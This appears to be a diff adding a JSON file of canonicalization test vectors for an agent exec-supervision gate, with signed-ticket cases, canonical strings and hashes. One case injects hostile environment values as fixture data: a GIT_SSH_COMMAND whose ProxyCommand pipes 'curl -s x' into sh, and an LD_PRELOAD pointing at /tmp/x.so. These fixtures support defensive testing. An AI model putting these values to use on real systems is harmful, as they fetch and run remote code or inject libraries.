@@ -1,0 +1,272 @@
+{
+  "generator": "wardenclaw-gate/src/canonical.js",
+  "cases": [
+    {
+      "name": "envelope-v1-exec",
+      "envelope": true,
+      "value": {
+        "v": 1,
+        "type": "exec",
+        "argv": [
+          "/bin/bash",
+          "-c",
+          "source ~/.snap && eval 'ls -la /tmp && echo \"done\" > /tmp/x <in'"
+        ],
+        "cwd": "/home/user/.openclaw/workspace",
+        "exe": "/usr/bin/bash",
+        "uid": 1000,
+        "gid": 1000,
+        "ppidChain": [
+          {
+            "pid": 4242,
+            "exe": "/usr/bin/node"
+          },
+          {
+            "pid": 4200,
+            "exe": "/home/user/.local/share/claude/versions/2.1.283"
+          }
+        ],
+        "env": [
+          {
+            "name": "HOME",
+            "value": "/home/user"
+          },
+          {
+            "name": "PATH",
+            "value": "/usr/local/bin:/usr/bin:/bin"
+          }
+        ],
+        "envHash": "fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000",
+        "requester": {
+          "host": "agent-host",
+          "supervisorId": "9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a"
+        },
+        "pidfdCookie": "pidfs:123456",
+        "ts": 1790447985039,
+        "nonce": "00112233445566778899aabbccddeeff"
+      },
+      "canonical": "{\"argv\":[\"/bin/bash\",\"-c\",\"source ~/.snap && eval 'ls -la /tmp && echo \\\"done\\\" > /tmp/x <in'\"],\"cwd\":\"/home/user/.openclaw/workspace\",\"env\":[{\"name\":\"HOME\",\"value\":\"/home/user\"},{\"name\":\"PATH\",\"value\":\"/usr/local/bin:/usr/bin:/bin\"}],\"envHash\":\"fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000\",\"exe\":\"/usr/bin/bash\",\"gid\":1000,\"nonce\":\"00112233445566778899aabbccddeeff\",\"pidfdCookie\":\"pidfs:123456\",\"ppidChain\":[{\"exe\":\"/usr/bin/node\",\"pid\":4242},{\"exe\":\"/home/user/.local/share/claude/versions/2.1.283\",\"pid\":4200}],\"requester\":{\"host\":\"agent-host\",\"supervisorId\":\"9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a\"},\"ts\":1790447985039,\"type\":\"exec\",\"uid\":1000,\"v\":1}",
+      "sha256": "0456c49624b8ac5b72c1709121cc026d295ba41990fa126d86263ed3d1939765"
+    },
+    {
+      "name": "envelope-unicode-argv",
+      "envelope": true,
+      "value": {
+        "v": 1,
+        "type": "exec",
+        "argv": [
+          "echo",
+          "привет мир",
+          "日本語",
+          "emoji 😀",
+          "tab\tnl\ncr\r",
+          "ctl\u0001\u001f",
+          "quote\"back\\slash",
+          "ls sep ",
+          "<&>"
+        ],
+        "cwd": "/tmp/каталог",
+        "exe": "/usr/bin/bash",
+        "uid": 1000,
+        "gid": 1000,
+        "ppidChain": [
+          {
+            "pid": 4242,
+            "exe": "/usr/bin/node"
+          },
+          {
+            "pid": 4200,
+            "exe": "/home/user/.local/share/claude/versions/2.1.283"
+          }
+        ],
+        "env": [
+          {
+            "name": "HOME",
+            "value": "/home/user"
+          },
+          {
+            "name": "PATH",
+            "value": "/usr/local/bin:/usr/bin:/bin"
+          }
+        ],
+        "envHash": "fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000",
+        "requester": {
+          "host": "agent-host",
+          "supervisorId": "9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a"
+        },
+        "pidfdCookie": "pidfs:123456",
+        "ts": 1790447985039,
+        "nonce": "00112233445566778899aabbccddeeff"
+      },
+      "canonical": "{\"argv\":[\"echo\",\"привет мир\",\"日本語\",\"emoji 😀\",\"tab\\tnl\\ncr\\r\",\"ctl\\u0001\\u001f\",\"quote\\\"back\\\\slash\",\"ls sep \",\"<&>\"],\"cwd\":\"/tmp/каталог\",\"env\":[{\"name\":\"HOME\",\"value\":\"/home/user\"},{\"name\":\"PATH\",\"value\":\"/usr/local/bin:/usr/bin:/bin\"}],\"envHash\":\"fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000\",\"exe\":\"/usr/bin/bash\",\"gid\":1000,\"nonce\":\"00112233445566778899aabbccddeeff\",\"pidfdCookie\":\"pidfs:123456\",\"ppidChain\":[{\"exe\":\"/usr/bin/node\",\"pid\":4242},{\"exe\":\"/home/user/.local/share/claude/versions/2.1.283\",\"pid\":4200}],\"requester\":{\"host\":\"agent-host\",\"supervisorId\":\"9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a\"},\"ts\":1790447985039,\"type\":\"exec\",\"uid\":1000,\"v\":1}",
+      "sha256": "63fd2a160b18c0a7fca45b319ddddcc9c9cc02de39e4cc75519f0a9d943b6155"
+    },
+    {
+      "name": "empty-argv-chain",
+      "envelope": true,
+      "value": {
+        "v": 1,
+        "type": "exec",
+        "argv": [],
+        "cwd": "/home/user/.openclaw/workspace",
+        "exe": "/usr/bin/bash",
+        "uid": 1000,
+        "gid": 1000,
+        "ppidChain": [],
+        "env": [],
+        "envHash": "fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000",
+        "requester": {
+          "host": "agent-host",
+          "supervisorId": "9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a"
+        },
+        "pidfdCookie": "pidfs:123456",
+        "ts": 1790447985039,
+        "nonce": "00112233445566778899aabbccddeeff"
+      },
+      "canonical": "{\"argv\":[],\"cwd\":\"/home/user/.openclaw/workspace\",\"env\":[],\"envHash\":\"fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000\",\"exe\":\"/usr/bin/bash\",\"gid\":1000,\"nonce\":\"00112233445566778899aabbccddeeff\",\"pidfdCookie\":\"pidfs:123456\",\"ppidChain\":[],\"requester\":{\"host\":\"agent-host\",\"supervisorId\":\"9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a\"},\"ts\":1790447985039,\"type\":\"exec\",\"uid\":1000,\"v\":1}",
+      "sha256": "2e92cf498c394df311e5998fc11081a64fbe7f17fecf13cfb462de0db6c9a56b"
+    },
+    {
+      "name": "envelope-env-loader",
+      "envelope": true,
+      "value": {
+        "v": 1,
+        "type": "exec",
+        "argv": [
+          "ssh",
+          "prod",
+          "uptime"
+        ],
+        "cwd": "/home/user/.openclaw/workspace",
+        "exe": "/usr/bin/ssh",
+        "uid": 1000,
+        "gid": 1000,
+        "ppidChain": [
+          {
+            "pid": 4242,
+            "exe": "/usr/bin/node"
+          },
+          {
+            "pid": 4200,
+            "exe": "/home/user/.local/share/claude/versions/2.1.283"
+          }
+        ],
+        "env": [
+          {
+            "name": "LD_PRELOAD",
+            "value": "/usr/lib/libfaketime.so"
+          },
+          {
+            "name": "GIT_SSH_COMMAND",
+            "value": "ssh -o ProxyCommand='sh -c \"curl -s x | sh\"'"
+          },
+          {
+            "name": "LD_PRELOAD",
+            "value": "/tmp/x.so"
+          },
+          {
+            "name": "PYTHONPATH",
+            "value": "/tmp/каталог/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            "cut": 5
+          }
+        ],
+        "envHash": "fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000",
+        "requester": {
+          "host": "agent-host",
+          "supervisorId": "9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a"
+        },
+        "pidfdCookie": "pidfs:123456",
+        "ts": 1790447985039,
+        "nonce": "00112233445566778899aabbccddeeff"
+      },
+      "canonical": "{\"argv\":[\"ssh\",\"prod\",\"uptime\"],\"cwd\":\"/home/user/.openclaw/workspace\",\"env\":[{\"name\":\"LD_PRELOAD\",\"value\":\"/usr/lib/libfaketime.so\"},{\"name\":\"GIT_SSH_COMMAND\",\"value\":\"ssh -o ProxyCommand='sh -c \\\"curl -s x | sh\\\"'\"},{\"name\":\"LD_PRELOAD\",\"value\":\"/tmp/x.so\"},{\"cut\":5,\"name\":\"PYTHONPATH\",\"value\":\"/tmp/каталог/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"}],\"envHash\":\"fc09a3d6b2e1c0ffee0000000000000000000000000000000000000000000000\",\"exe\":\"/usr/bin/ssh\",\"gid\":1000,\"nonce\":\"00112233445566778899aabbccddeeff\",\"pidfdCookie\":\"pidfs:123456\",\"ppidChain\":[{\"exe\":\"/usr/bin/node\",\"pid\":4242},{\"exe\":\"/home/user/.local/share/claude/versions/2.1.283\",\"pid\":4200}],\"requester\":{\"host\":\"agent-host\",\"supervisorId\":\"9f2c0a4b6e8d1f3a5c7e9b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a\"},\"ts\":1790447985039,\"type\":\"exec\",\"uid\":1000,\"v\":1}",
+      "sha256": "fcdd333107368b117692ad7958094a7ee75b1b88d81a1d1e00fb05cc00fbdc93"
+    },
+    {
+      "name": "key-order-utf16",
+      "envelope": false,
+      "value": {
+        "9": 7,
+        "10": 6,
+        "ﬀ": 1,
+        "😀": 2,
+        "a": 3,
+        "B": 4,
+        "": 5,
+        "ä": 8
+      },
+      "canonical": "{\"\":5,\"10\":6,\"9\":7,\"B\":4,\"a\":3,\"ä\":8,\"😀\":2,\"ﬀ\":1}",
+      "sha256": "cc301f443ab005317542e7de22b68e6f3656b3cecf64d12e4aaabd67c33aa315"
+    },
+    {
+      "name": "numbers",
+      "envelope": false,
+      "value": {
+        "a": 0,
+        "b": -1,
+        "c": 1.5,
+        "d": 1e+21,
+        "e": 1e-7,
+        "f": 123456789012345,
+        "g": 0.000001,
+        "h": 2e-7,
+        "i": 1.7976931348623157e+308,
+        "j": 5e-324,
+        "k": 100,
+        "l": 100000000000000000000,
+        "m": -0.5
+      },
+      "canonical": "{\"a\":0,\"b\":-1,\"c\":1.5,\"d\":1e+21,\"e\":1e-7,\"f\":123456789012345,\"g\":0.000001,\"h\":2e-7,\"i\":1.7976931348623157e+308,\"j\":5e-324,\"k\":100,\"l\":100000000000000000000,\"m\":-0.5}",
+      "sha256": "94e6256f0dd61ff789ee9e1076ff90346499bc223d31b73e8713594d17110382"
+    },
+    {
+      "name": "nested-null-bool",
+      "envelope": false,
+      "value": {
+        "x": [
+          null,
+          true,
+          false,
+          {
+            "z": [],
+            "y": {}
+          }
+        ],
+        "y": null
+      },
+      "canonical": "{\"x\":[null,true,false,{\"y\":{},\"z\":[]}],\"y\":null}",
+      "sha256": "7f62d9ed5159e7f961b26a2511583710f6c1e34782a4e45d9f65bf013e418c9c"
+    },
+    {
+      "name": "decision-signing-string",
+      "envelope": false,
+      "value": {
+        "type": "wardenclaw.ticket.exec.v1",
+        "supervisorId": "39f713d0a644253f04529421b9f51b9b08979d08295959c4f3990ee617f5139f",
+        "deviceId": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "id": "wd-0123456789abcdef0123456789abcdef",
+        "digest": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+        "decision": "allow",
+        "ts": 1790447985039,
+        "nonce": "3b241101-e2bb-4255-8caf-4136c566a962"
+      },
+      "canonical": "{\"decision\":\"allow\",\"deviceId\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\"digest\":\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\",\"id\":\"wd-0123456789abcdef0123456789abcdef\",\"nonce\":\"3b241101-e2bb-4255-8caf-4136c566a962\",\"supervisorId\":\"39f713d0a644253f04529421b9f51b9b08979d08295959c4f3990ee617f5139f\",\"ts\":1790447985039,\"type\":\"wardenclaw.ticket.exec.v1\"}",
+      "sha256": "0ab5bc4905a5cc4ec0995f979a80e64c4e4d3776580af9678669d2d133a74f21"
+    },
+    {
+      "name": "decision-signing-string-tool",
+      "envelope": false,
+      "value": {
+        "type": "wardenclaw.ticket.tool.v1",
+        "deviceId": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+        "id": "c0ffee00-0000-4000-8000-000000000001",
+        "digest": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+        "decision": "allow",
+        "ts": 1790447985039,
+        "nonce": "3b241101-e2bb-4255-8caf-4136c566a962"
+      },
+      "canonical": "{\"decision\":\"allow\",\"deviceId\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\"digest\":\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\",\"id\":\"c0ffee00-0000-4000-8000-000000000001\",\"nonce\":\"3b241101-e2bb-4255-8caf-4136c566a962\",\"ts\":1790447985039,\"type\":\"wardenclaw.ticket.tool.v1\"}",
+      "sha256": "3a8cdf805879ef26d8e88036f53254345f1a812642f8189d2fc12380c2d4c529"
+    }
+  ]
+}
